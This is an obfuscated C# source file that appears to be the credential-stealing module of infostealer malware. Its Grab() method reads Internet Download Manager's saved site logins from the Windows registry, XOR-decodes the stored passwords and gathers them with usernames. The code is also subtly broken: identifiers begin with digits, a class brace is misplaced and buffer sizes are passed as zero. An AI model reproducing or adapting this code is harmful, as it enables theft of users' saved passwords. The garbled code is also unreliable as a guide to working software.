using System;
using System.Collections.Generic;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using C6Zy;
using Microsoft.Win32;

namespace rk937aHHc
{
	public class Internet_DownloaderManager : EtbH
	{
		public Internet_DownloaderManager()
		{
			this.E8EfTr = "Internet Downloader Manager";
		}

		public string E8EfTr { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();

            const string regPath = @"Software\DownloadManager\Passwords\";
            IntPtr hKeyRoot = new IntPtr(unchecked((int)0x80000001)); // HKEY_CURRENT_USER

            try
            {
                using (RegistryKey baseKey = Registry.CurrentUser.OpenSubKey(regPath))
                {
                    if (baseKey == null)
                        return list;

                    foreach (string subKeyName in baseKey.GetSubKeyNames())
                    {
                        Internet_DownloaderManager.Z53Zw hKey = null;

                        Internet_DownloaderManager.9gNckgj.RegOpenKeyEx(
                            hKeyRoot,
                            regPath + subKeyName,
                            0,
                            131097,
                            ref hKey
                        );

                        byte[] userBuf = new byte[257];
                        byte[] passBuf = new byte[257];
                        int type = 0;
                        int size = 0;

                        Internet_DownloaderManager.9gNckgj.RegQueryValueEx(
                            hKey,
                            "User",
                            0,
                            out type,
                            userBuf,
                            ref size
                        );

                        Internet_DownloaderManager.9gNckgj.RegQueryValueEx(
                            hKey,
                            "EncPassword",
                            0,
                            out type,
                            passBuf,
                            ref size
                        );

                        int userLen = 0;
                        while (userLen < userBuf.Length && userBuf[userLen] != 0)
                            userLen++;

                        string user = Encoding.Default.GetString(userBuf, 0, userLen);

                        StringBuilder password = new StringBuilder();
                        for (int i = 0; i < passBuf.Length && passBuf[i] != 0; i++)
                        {
                            password.Append((char)(passBuf[i] ^ 0x0F));
                        }

                        list.Add(new WTitxI2m
                        {
                            data1 = subKeyName,
                            data2 = user,
                            data3 = password.ToString(),
                            data4 = this.E8EfTr
                        });
                    }
                }
            }
            catch
            {
            }

            return list;
        }

        public class Z53Zw : SafeHandle
		{
			public Z53Zw() : base(IntPtr.Zero, true)
			{
			}

			public override bool 6CtaOhXmVw
			{
				get
				{
					return this.handle == IntPtr.Zero;
				}
			}

			protected override bool ReleaseHandle()
			{
				return Internet_DownloaderManager.9gNckgj.RegCloseKey(this.handle) == 0;
			}
		

		[SuppressUnmanagedCodeSecurity]
		public class 9gNckgj
		{
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("Advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
			public static extern int RegOpenKeyEx([In] IntPtr hKey, [In] string subKey, int options, [In] int samDesired, [In] [Out] ref Internet_DownloaderManager.Z53Zw phkResult);

			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
			[DllImport("Advapi32", SetLastError = true)]
			public static extern int RegCloseKey(IntPtr hKey);

			[DllImport("Advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
			public static extern int RegQueryValueEx([In] Internet_DownloaderManager.Z53Zw hKey, [In] string lpValueName, int reserved, out int type, [In] [Out] byte[] data, [In] [Out] ref int dataSize);
		}
    }
}

